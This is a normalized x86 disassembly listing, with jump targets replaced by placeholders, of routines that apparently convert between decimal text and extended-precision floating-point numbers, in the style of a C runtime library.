sub [ ebp - 0x40 ] 0x2
dec [ ebp - 0x2c ]
cmp [ ebp - 0x2c ] 0x0
jg r-xdata
inc [ esi ]
cmp [ ebp - 0x44 ] 0x0
mov [ esi - 0x4 ] edi
je r-xdata
mov [ eax + 0x8 ] esi
mov [ eax + 0x4 ] esi
mov [ eax ] esi
jmp r-xdata
mov ecx 0x8000
cmp [ ebp - 0x10 ] cx
ja r-xdata
mov ecx edi
neg ecx
movzx esi cx
add edi esi
test di di
jg r-xdata
mov esi [ ebp - 0xc ]
mov ecx [ ebp - 0x10 ]
shl [ ebp - 0x10 ] 0x1
shr ecx 0x1f
mov edx esi
add esi esi
or esi ecx
mov ecx [ ebp - 0x8 ]
shr edx 0x1f
add ecx ecx
or ecx edx
add edi 0xffff
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] ecx
test di di
jg r-xdata
mov ecx [ ebp - 0x3c ]
mov edx [ ebp - 0x40 ]
movzx edx [ edx ]
movzx ecx [ ecx ]
and [ ebp - 0x44 ] 0x0
imul ecx edx
mov edx [ esi - 0x4 ]
lea edi [ edx + ecx ]
cmp edi edx
jb r-xdata
mov edi [ ebp - 0x28 ]
cmp [ ebp - 0xe ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x10 ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
mov edx [ ebp - 0xc ]
shr [ ebp - 0x8 ] 0x1
shl ecx 0x1f
shr ebx 0x1
or ebx ecx
mov ecx [ ebp - 0x10 ]
shl edx 0x1f
shr ecx 0x1
or ecx edx
dec esi
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
jne r-xdata
inc [ ebp - 0x38 ]
inc [ ebp - 0xe ]
and [ ebp - 0xe ] 0x0
cmp [ ebp - 0xa ] 0xffffffff
jne r-xdata
mov ecx 0x7fff
cmp di cx
jae r-xdata
test [ ebp - 0x10 ] 0x1
je r-xdata
cmp [ ebp - 0x38 ] esi
je r-xdata
mov cx [ ebp - 0xe ]
or edi [ ebp - 0x30 ]
mov [ eax ] cx
mov ecx [ ebp - 0xc ]
mov [ eax + 0x2 ] ecx
mov ecx [ ebp - 0x8 ]
mov [ eax + 0x6 ] ecx
mov [ eax + 0xa ] di
jmp r-xdata
inc [ ebp - 0xa ]
jmp r-xdata
and [ ebp - 0xa ] 0x0
mov edx 0xffff
cmp [ ebp - 0x6 ] dx
jne r-xdata
or [ ebp - 0x10 ] 0x1
inc [ ebp - 0x6 ]
jmp r-xdata
mov [ ebp - 0x6 ] cx
inc edi
jmp r-xdata
sub_4227f8
mov edi edi
push ebp
mov ebp esp
sub esp 0x7c
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
xor ecx ecx
push esi
xor esi esi
mov [ ebp - 0x78 ] eax
mov eax [ ebp + 0xc ]
inc esi
push edi
mov [ ebp - 0x70 ] eax
lea edi [ ebp - 0x20 ]
mov [ ebp - 0x74 ] ecx
mov [ ebp - 0x68 ] esi
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x58 ] ecx
mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x60 ] ecx
mov [ ebp - 0x64 ] ecx
mov [ ebp - 0x50 ] ecx
mov [ ebp - 0x6c ] ecx
cmp [ ebp + 0x24 ] ecx
jne r-xdata
mov edx [ ebp + 0x10 ]
mov [ ebp - 0x54 ] edx
call sub_40d1fa
mov [ eax ] 0x16
call sub_40e72d
xor eax eax
jmp r-xdata
inc edx
jmp r-xdata
cmp al 0x9
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_40b946
leave
retn
mov al [ edx ]
cmp al 0x20
je r-xdata
cmp al 0xa
je r-xdata
cmp al 0xd
jne r-xdata
push ebx
mov bl 0x30
cmp ecx 0xa
jne r-xdata
jmp [ ecx * 4 + jump_table_422ea4 ]
mov al [ edx ]
inc edx
cmp ecx 0xb
ja r-xdata
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
lea ecx [ eax - 0x31 ]
mov [ ebp - 0x58 ] esi
cmp cl 0x8
jbe r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
mov [ ebp - 0x58 ] esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x58 ] esi
mov [ ebp - 0x5c ] esi
jne r-xdata
sub al bl
mov [ ebp - 0x5c ] esi
cmp al 0x9
ja r-xdata
lea ecx [ edx - 0x2 ]
mov [ ebp - 0x54 ] ecx
lea ecx [ eax - 0x31 ]
cmp cl 0x8
ja r-xdata
mov [ ebp - 0x60 ] esi
jmp r-xdata
lea ecx [ eax - 0x31 ]
cmp cl 0x8
jbe r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x60 ] esi
xor ecx ecx
jmp r-xdata
cmp [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x70 ]
mov [ eax ] edx
je r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
push 0x3
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
jne r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al bl
jge r-xdata
cmp al bl
jge r-xdata
jmp r-xdata
mov edx [ ebp - 0x54 ]
jmp r-xdata
push 0x4
jmp r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x9
jmp r-xdata
cmp al bl
je r-xdata
cmp al bl
jmp r-xdata
push 0xa
pop ecx
dec edx
movsx eax al
sub eax 0x2b
lea ecx [ edx - 0x1 ]
mov [ ebp - 0x54 ] ecx
je r-xdata
cmp al bl
jge r-xdata
mov [ ebp - 0x6c ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x4c ] eax
jbe r-xdata
movsx eax al
sub eax 0x2b
je r-xdata
push 0x5
cmp al 0x2b
je r-xdata
push 0x4
jmp r-xdata
cmp al bl
je r-xdata
cmp al 0x39
jg r-xdata
mov ecx [ ebp + 0x24 ]
mov ecx [ ecx ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
cmp al [ ecx ]
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
cmp al bl
je r-xdata
pop ecx
dec edx
jmp r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
mov al [ edx ]
inc edx
sub al 0x31
cmp al 0x8
jbe r-xdata
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
xor ecx ecx
xor eax eax
xor edx edx
xor esi esi
cmp [ ebp - 0x4c ] 0x0
jbe r-xdata
cmp [ ebp - 0x9 ] 0x5
jl r-xdata
and [ ebp - 0x74 ] 0x0
push 0x2
pop ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
dec edx
push 0xb
jmp r-xdata
cmp al 0x2d
je r-xdata
pop ecx
jmp r-xdata
mov ecx esi
jmp r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
cmp al 0x2b
je r-xdata
cmp [ ebp - 0x4c ] 0x19
jae r-xdata
dec [ ebp - 0x50 ]
mov al [ edx ]
inc edx
jmp r-xdata
or [ ebp - 0x68 ] 0xffffffff
push 0x7
pop ecx
jmp r-xdata
sub eax 0x3
dec edx
jmp r-xdata
push 0x8
jmp r-xdata
mov edx ecx
mov [ ebp - 0x64 ] ecx
jmp r-xdata
imul ecx ecx 0xa
movsx esi al
lea ecx [ ecx + esi - 0x30 ]
cmp ecx 0x1450
jg r-xdata
jmp r-xdata
dec edi
inc [ ebp - 0x50 ]
mov [ ebp - 0x4c ] eax
inc [ ebp - 0x9 ]
push 0x2
pop ecx
mov [ ebp - 0x74 ] 0x8000
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al bl
je r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
jmp r-xdata
cmp al 0x2d
je r-xdata
mov al [ edx ]
inc edx
inc [ ebp - 0x4c ]
sub al bl
mov [ edi ] al
inc edi
dec [ ebp - 0x50 ]
cmp al bl
jge r-xdata
mov ecx 0x1451
mov al [ edx ]
inc edx
dec edi
cmp [ edi ] 0x0
je r-xdata
cmp al 0x43
jle r-xdata
mov al [ edx ]
inc edx
jmp r-xdata
cmp al 0x39
jg r-xdata
jmp r-xdata
dec [ ebp - 0x4c ]
inc [ ebp - 0x50 ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x4c ]
lea eax [ ebp - 0x20 ]
push eax
call sub_424946
mov eax [ ebp - 0x64 ]
xor edx edx
add esp 0xc
cmp [ ebp - 0x68 ] edx
jge r-xdata
cmp al 0x45
jle r-xdata
mov al [ edx ]
inc edx
add eax [ ebp - 0x50 ]
cmp [ ebp - 0x60 ] edx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
sub al 0x64
cmp al 0x1
ja r-xdata
cmp [ ebp - 0x5c ] edx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor esi esi
mov eax 0x7fff
mov edx 0x80000000
xor ecx ecx
mov [ ebp - 0x6c ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov edi [ ebp - 0x78 ]
or eax [ ebp - 0x74 ]
mov [ edi ] cx
mov [ edi + 0xa ] ax
mov eax [ ebp - 0x6c ]
mov [ edi + 0x2 ] esi
mov [ edi + 0x6 ] edx
pop ebx
mov [ ebp - 0x6c ] 0x1
mov ecx rwxdata
sub ecx 0x60
mov [ ebp - 0x54 ] eax
cmp eax edx
je r-xdata
mov eax [ ebp - 0x34 ]
movzx ecx [ ebp - 0x3c ]
mov esi [ ebp - 0x3a ]
mov edx [ ebp - 0x36 ]
shr eax 0x10
jmp r-xdata
jge r-xdata
cmp [ ebp + 0x14 ] edx
jne r-xdata
neg eax
mov ecx rwxdata
mov [ ebp - 0x54 ] eax
sub ecx 0x60
cmp [ ebp - 0x54 ] edx
je r-xdata
xor eax eax
mov [ ebp - 0x3c ] ax
jmp r-xdata
mov eax [ ebp - 0x54 ]
sar [ ebp - 0x54 ] 0x3
add ecx 0x54
and eax 0x7
mov [ ebp - 0x7c ] ecx
cmp eax edx
je r-xdata
cmp [ ebp - 0x54 ] 0x0
jne r-xdata
imul eax eax 0xc
lea ebx [ ecx + eax ]
mov eax 0x8000
cmp [ ebx ] ax
jb r-xdata
mov ecx [ ebp - 0x7c ]
xor edx edx
mov edx [ ebp - 0x32 ]
xor eax eax
mov [ ebp - 0x50 ] eax
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
movzx eax [ ebx + 0xa ]
mov esi eax
xor esi [ ebp - 0x32 ]
mov ecx 0x7fff
and edx ecx
and eax ecx
and esi 0x8000
mov edi 0x7fff
lea ecx [ eax + edx ]
mov [ ebp - 0x70 ] esi
movzx ecx cx
cmp dx di
jae r-xdata
mov esi ebx
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x46 ]
lea ebx [ ebp - 0x48 ]
xor eax eax
test si si
sete al
and [ ebp - 0x38 ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x3c ] 0x0
cmp ax di
jae r-xdata
mov edi 0xbffd
cmp cx di
ja r-xdata
mov esi 0x3fbf
cmp cx si
ja r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor eax eax
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x3c ] eax
jmp r-xdata
cmp ax si
jne r-xdata
inc ecx
test [ ebp - 0x34 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x68 ] esi
lea edi [ ebp - 0x28 ]
mov [ ebp - 0x58 ] 0x5
inc ecx
test [ ebx + 0x8 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x38 ] esi
jne r-xdata
add edi 0x2
inc [ ebp - 0x68 ]
dec [ ebp - 0x58 ]
cmp [ ebp - 0x58 ] 0x0
jg r-xdata
lea eax [ ebp + eax - 0x3c ]
mov [ ebp - 0x5c ] eax
lea eax [ ebx + 0x8 ]
mov [ ebp - 0x60 ] eax
cmp [ ebx + 0x4 ] esi
jne r-xdata
cmp [ ebp - 0x3c ] esi
jne r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ ebp - 0x58 ]
add eax eax
mov [ ebp - 0x64 ] edx
test edx edx
jle r-xdata
add ecx 0xc002
test cx cx
jle r-xdata
mov [ ebp - 0x4c ] 0x1
cmp esi eax
jae r-xdata
cmp [ ebx ] esi
jne r-xdata
xor eax eax
mov [ ebp - 0x32 ] ax
jmp r-xdata
add ecx 0xffff
test cx cx
jns r-xdata
mov edi [ ebp - 0x24 ]
test edi edi
js r-xdata
add [ ebp - 0x5c ] 0x2
sub [ ebp - 0x60 ] 0x2
dec [ ebp - 0x64 ]
cmp [ ebp - 0x64 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x4c ] 0x0
mov [ edi - 0x4 ] esi
je r-xdata
mov [ ebp - 0x34 ] esi
mov [ ebp - 0x38 ] esi
mov [ ebp - 0x3c ] esi
jmp r-xdata
mov eax 0x8000
cmp [ ebp - 0x2c ] ax
ja r-xdata
mov eax ecx
neg eax
movzx esi ax
add ecx esi
test cx cx
jg r-xdata
mov esi [ ebp - 0x28 ]
mov eax [ ebp - 0x2c ]
shl [ ebp - 0x2c ] 0x1
shr eax 0x1f
mov edx esi
add esi esi
or esi eax
shr edx 0x1f
lea eax [ edi + edi ]
or eax edx
add ecx 0xffff
mov [ ebp - 0x28 ] esi
mov [ ebp - 0x24 ] eax
test cx cx
jg r-xdata
mov eax [ ebp - 0x60 ]
mov edx [ ebp - 0x5c ]
movzx edx [ edx ]
movzx eax [ eax ]
and [ ebp - 0x4c ] 0x0
imul eax edx
mov edx [ edi - 0x4 ]
lea esi [ edx + eax ]
cmp esi edx
jb r-xdata
cmp [ ebp - 0x2a ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x2c ]
and edx 0x1ffff
cmp edx 0x18000
jne r-xdata
mov eax [ ebp - 0x24 ]
mov edi [ ebp - 0x28 ]
mov edx [ ebp - 0x28 ]
shr [ ebp - 0x24 ] 0x1
shl eax 0x1f
shr edi 0x1
or edi eax
mov eax [ ebp - 0x2c ]
shl edx 0x1f
shr eax 0x1
or eax edx
dec esi
mov [ ebp - 0x28 ] edi
mov [ ebp - 0x2c ] eax
jne r-xdata
inc [ ebp - 0x50 ]
inc [ ebp - 0x2a ]
and [ ebp - 0x2a ] 0x0
cmp [ ebp - 0x26 ] 0xffffffff
jne r-xdata
mov eax 0x7fff
cmp cx ax
jb r-xdata
test [ ebp - 0x2c ] 0x1
je r-xdata
cmp [ ebp - 0x50 ] esi
je r-xdata
mov ax [ ebp - 0x2a ]
or ecx [ ebp - 0x70 ]
mov [ ebp - 0x3c ] ax
mov eax [ ebp - 0x28 ]
mov [ ebp - 0x3a ] eax
mov eax [ ebp - 0x24 ]
mov [ ebp - 0x36 ] eax
mov [ ebp - 0x32 ] cx
jmp r-xdata
xor eax eax
xor ecx ecx
cmp [ ebp - 0x70 ] ax
mov [ ebp - 0x38 ] eax
sete cl
mov [ ebp - 0x3c ] eax
dec ecx
and ecx 0x80000000
add ecx 0x7fff8000
mov [ ebp - 0x34 ] ecx
jmp r-xdata
inc [ ebp - 0x26 ]
jmp r-xdata
and [ ebp - 0x26 ] 0x0
mov edx 0xffff
cmp [ ebp - 0x22 ] dx
jne r-xdata
or [ ebp - 0x2c ] 0x1
inc [ ebp - 0x22 ]
jmp r-xdata
mov [ ebp - 0x22 ] ax
inc ecx
jmp r-xdata
sub_422ed4
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
mov ecx [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
push edx
xor edx edx
push edx
push edx
push edx
push [ ebp + 0x14 ]
push ecx
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_4227f8
mov edi eax
lea eax [ ebp - 0x10 ]
push esi
push eax
call sub_42213c
add esp 0x28
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax edi
pop edi
xor ecx ebp
pop esi
call sub_40b946
leave
retn
or edi 0x2
sub_422f2f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx [ edi ]
lea esi [ ecx + edx ]
xor ebx ebx
cmp esi ecx
jb r-xdata
xor ebx ebx
inc ebx
cmp esi edx
jae r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ edi + 0x4 ]
lea esi [ ecx + edx ]
xor ebx ebx
cmp esi ecx
jb r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ecx + 0x1 ]
xor esi esi
cmp edx ecx
jb r-xdata
mov [ eax ] esi
test ebx ebx
je r-xdata
xor ebx ebx
inc ebx
cmp esi edx
jae r-xdata
xor esi esi
inc esi
cmp edx 0x1
jae r-xdata
mov ecx [ edi + 0x8 ]
add [ eax + 0x8 ] ecx
pop edi
pop esi
pop ebx
pop ebp
retn
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] esi
test ebx ebx
je r-xdata
inc [ eax + 0x8 ]
mov [ eax + 0x4 ] edx
test esi esi
je r-xdata
sub_422fa0
mov edi edi
push ebp
mov ebp esp
sub esp 0x74
mov eax [ rwxdata ]
xor eax ebp
mov [ ebp - 0x4 ] eax
movzx eax [ ebp + 0x10 ]
movzx edx [ ebp + 0x10 ]
mov ecx 0x8000
and eax ecx
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x60 ] eax
lea eax [ ecx - 0x1 ]
push esi
and edx eax
cmp [ ebp - 0x60 ] 0x0
push edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x30 ] 0xcccccccc
mov [ ebp - 0x2c ] 0xcccccccc
mov [ ebp - 0x28 ] 0x3ffbcccc
mov [ ebp - 0x74 ] 0x1
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx ax
jne r-xdata
test esi esi
jne r-xdata
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
test dx dx
jne r-xdata
movzx ecx dx
mov ebx ecx
imul ecx ecx 0x4d10
mov eax esi
shr eax 0x18
shr ebx 0x8
lea eax [ ebx + eax * 2 ]
imul eax eax 0x4d
lea eax [ eax + ecx - 0x134312f4 ]
sar eax 0x10
movzx eax ax
xor ecx ecx
mov [ ebp - 0x20 ] cx
movsx ebx ax
mov ecx rwxdata
sub ecx 0x60
neg ebx
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x16 ] dx
mov [ ebp - 0x1a ] esi
mov [ ebp - 0x1e ] edi
mov [ ebp - 0x68 ] ecx
je r-xdata
mov ecx [ ebp + 0xc ]
xor eax eax
inc eax
mov [ ebx ] ax
mov eax 0x80000000
cmp ecx eax
jne r-xdata
test edi edi
jne r-xdata
mov ecx [ ebp - 0x18 ]
shr ecx 0x10
mov edx 0x3fff
mov eax 0x7fff
cmp cx dx
jb r-xdata
test ebx ebx
jns r-xdata
test ecx 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp - 0x60 ] cx
mov [ ebx ] ax
setne al
dec al
and al 0xd
add al 0x20
mov [ ebx + 0x2 ] al
mov [ ebx + 0x3 ] 0x3001
mov [ ebx + 0x5 ] 0x0
test [ ebp + 0x18 ] 0x1
mov edx [ ebp - 0x64 ]
mov eax [ ebp - 0x4c ]
mov edi [ ebp + 0x14 ]
mov [ edx ] ax
je r-xdata
mov ebx [ ebp - 0x26 ]
inc [ ebp - 0x4c ]
xor edx edx
mov [ ebp - 0x50 ] edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] edx
mov edx [ ebp - 0x26 ]
xor ebx ecx
and ecx eax
and edx eax
and ebx 0x8000
lea esi [ edx + ecx ]
mov [ ebp - 0x5c ] ebx
movzx esi si
cmp cx ax
jae r-xdata
je r-xdata
mov eax rwxdata
sub eax 0x60
neg ebx
mov [ ebp - 0x68 ] eax
test ebx ebx
xor edx edx
cmp [ ebp - 0x60 ] dx
je r-xdata
push r--data
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40b946
leave
retn
cmp edi 0x15
jle r-xdata
cwde
add edi eax
test edi edi
jg r-xdata
xor eax eax
test bx bx
sete al
and [ ebp - 0x1c ] 0x0
dec eax
and eax 0x80000000
add eax 0x7fff8000
and [ ebp - 0x20 ] 0x0
cmp dx ax
jae r-xdata
add [ ebp - 0x68 ] 0x54
mov ecx ebx
sar ebx 0x3
and ecx 0x7
je r-xdata
cmp ecx eax
jne r-xdata
cmp ecx 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_419700
add esp 0xc
test eax eax
jne r-xdata
mov esi [ ebp - 0x18 ]
shr esi 0x10
sub esi 0x3ffe
xor eax eax
mov [ ebp - 0x16 ] ax
mov [ ebp - 0x44 ] 0x8
push 0x15
pop edi
xor eax eax
mov [ edx ] ax
mov eax 0x8000
cmp [ ebp - 0x60 ] ax
mov [ edx + 0x3 ] 0x3001
setne al
dec al
and al 0xd
add al 0x20
mov [ edx + 0x2 ] al
mov [ edx + 0x5 ] 0x0
jmp r-xdata
mov eax 0xbffd
cmp si ax
ja r-xdata
xor esi esi
imul ecx ecx 0xc
add ecx [ ebp - 0x68 ]
mov eax ecx
mov [ ebp - 0x44 ] ecx
mov ecx 0x8000
cmp [ eax ] cx
jb r-xdata
push r--data
cmp [ ebp + 0x8 ] edx
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_40e6c1
mov [ ebx + 0x3 ] 0x6
mov eax [ ebp - 0x20 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shl [ ebp - 0x20 ] 0x1
shr eax 0x1f
add ebx ebx
or ebx eax
mov eax [ ebp - 0x18 ]
shr ecx 0x1f
add eax eax
or eax ecx
dec [ ebp - 0x44 ]
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] eax
jne r-xdata
test esi esi
jns r-xdata
xor eax eax
inc eax
jmp r-xdata
mov eax 0x3fbf
cmp si ax
ja r-xdata
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] ecx
movzx ecx [ eax + 0xa ]
mov edx ecx
xor edx [ ebp - 0x16 ]
mov esi 0x7fff
and edx 0x8000
mov [ ebp - 0x58 ] edx
mov edx [ ebp - 0x16 ]
and edx esi
and ecx esi
lea esi [ ecx + edx ]
movzx edi si
mov esi 0x7fff
cmp dx si
jae r-xdata
mov esi eax
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
dec [ ebp - 0x3a ]
mov [ ebp - 0x44 ] eax
push r--data
push r--data
jmp r-xdata
lea eax [ edi + 0x1 ]
lea ebx [ edx + 0x4 ]
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x4c ] eax
test eax eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
xor eax eax
cmp cx ax
jne r-xdata
xor eax eax
xor eax eax
xor esi esi
cmp [ ebp - 0x58 ] si
sete al
dec eax
and eax 0x80000000
add eax 0x7fff8000
mov [ ebp - 0x18 ] eax
jmp r-xdata
cmp cx si
jae r-xdata
mov [ ebx + 0x3 ] 0x5
jmp r-xdata
lea eax [ ebx + 0x4 ]
push 0x16
push eax
call sub_419700
add esp 0xc
test eax eax
jne r-xdata
mov al [ ebx - 0x1 ]
sub ebx 0x2
cmp al 0x35
jge r-xdata
mov edx [ ebp - 0x20 ]
mov eax [ ebp - 0x1c ]
lea esi [ ebp - 0x20 ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
shl [ ebp - 0x20 ] 0x1
mov edi [ ebp - 0x20 ]
shl [ ebp - 0x20 ] 0x1
shr edx 0x1f
lea ecx [ eax + eax ]
or ecx edx
mov edx [ ebp - 0x18 ]
mov esi eax
shr esi 0x1f
add edx edx
or edx esi
mov eax ecx
lea esi [ ecx + ecx ]
shr eax 0x1f
lea ecx [ edx + edx ]
mov edx [ ebp - 0x3c ]
shr edi 0x1f
or ecx eax
mov eax [ ebp - 0x20 ]
or esi edi
lea edi [ edx + eax ]
cmp edi eax
jb r-xdata
mov eax [ ebp - 0x18 ]
mov ebx [ ebp - 0x1c ]
mov ecx [ ebp - 0x1c ]
shr [ ebp - 0x18 ] 0x1
shl eax 0x1f
shr ebx 0x1
or ebx eax
mov eax [ ebp - 0x20 ]
shl ecx 0x1f
shr eax 0x1
or eax ecx
dec esi
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x20 ] eax
test esi esi
jg r-xdata
cmp dx ax
jne r-xdata
inc esi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x20 ] esi
jmp r-xdata
mov esi 0xbffd
cmp di si
ja r-xdata
xor eax eax
jmp r-xdata
cmp ebx [ ebp - 0x40 ]
jae r-xdata
mov ecx [ ebp - 0x40 ]
jmp r-xdata
lea eax [ esi + 0x1 ]
xor edx edx
cmp eax esi
jb r-xdata
cmp edi edx
jae r-xdata
mov [ ebp - 0x54 ] eax
lea edi [ ebp - 0xc ]
mov [ ebp - 0x40 ] 0x5
inc esi
test [ ebp - 0x28 ] 0x7fffffff
jne r-xdata
cmp [ ebp - 0x1c ] eax
jne r-xdata
cmp ebx esi
jne r-xdata
mov esi 0x3fbf
cmp di si
ja r-xdata
cmp [ ebx ] 0x39
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx [ ebp - 0x40 ]
jae r-xdata
cmp ebx ecx
jae r-xdata
xor edx edx
inc edx
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x38 ]
lea edx [ eax + esi ]
mov [ ebp - 0x44 ] edx
cmp edx esi
jb r-xdata
add edi 0x2
inc [ ebp - 0x54 ]
dec [ ebp - 0x40 ]
cmp [ ebp - 0x40 ] 0x0
jg r-xdata
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x58 ] ecx
lea eax [ ebp + eax - 0x20 ]
cmp [ ebp - 0x2c ] eax
jne r-xdata
cmp [ ebp - 0x20 ] eax
jne r-xdata
xor esi esi
cmp dx si
jne r-xdata
xor esi esi
mov [ ebx ] 0x30
dec ebx
inc [ ebx ]
inc ebx
inc [ eax ]
cmp [ ebx ] 0x30
jne r-xdata
mov eax [ ebp - 0x64 ]
cmp ebx ecx
jae r-xdata
inc ecx
mov esi eax
test edx edx
je r-xdata
inc ecx
cmp edx eax
jae r-xdata
mov eax [ ebp - 0x54 ]
mov ecx [ ebp - 0x40 ]
add eax eax
mov [ ebp - 0x48 ] ecx
test ecx ecx
jle r-xdata
add esi 0xc002
test si si
jle r-xdata
mov [ ebp - 0x44 ] 0x1
cmp ebx ecx
jae r-xdata
cmp [ ebp - 0x30 ] eax
je r-xdata
mov [ ebp - 0x16 ] ax
jmp r-xdata
cmp cx si
jne r-xdata
inc edi
test [ ebp - 0x18 ] 0x7fffffff
jne r-xdata
dec ebx
sub bl al
sub bl 0x3
movsx ecx bl
mov [ eax + 0x3 ] bl
mov [ ecx + eax + 0x4 ] 0x0
mov eax [ ebp - 0x74 ]
xor edx edx
mov [ eax ] dx
mov edx 0x8000
cmp [ ebp - 0x60 ] dx
mov [ eax + 0x3 ] 0x1
setne dl
dec dl
and dl 0xd
add dl 0x20
mov [ eax + 0x2 ] dl
mov [ ecx ] 0x30
mov [ eax + 0x5 ] 0x0
jmp r-xdata
add ecx [ ebp - 0x34 ]
shr edx 0x1f
add ecx ecx
or ecx edx
lea esi [ edi + edi ]
mov [ ebp - 0x20 ] esi
mov esi [ ebp - 0x44 ]
mov [ ebp - 0x18 ] ecx
shr ecx 0x18
add esi esi
add cl 0x30
mov eax edi
shr eax 0x1f
or esi eax
mov [ ebx ] cl
inc ebx
dec [ ebp - 0x4c ]
cmp [ ebp - 0x4c ] 0x0
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x15 ] 0x0
jg r-xdata
add esi 0xffff
test si si
jns r-xdata
mov edi [ ebp - 0x8 ]
test edi edi
js r-xdata
sub [ ebp - 0x58 ] 0x2
add eax 0x2
dec [ ebp - 0x48 ]
cmp [ ebp - 0x48 ] 0x0
jg r-xdata
inc [ edi ]
cmp [ ebp - 0x44 ] 0x0
mov [ edi - 0x4 ] ebx
je r-xdata
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] eax
jmp r-xdata
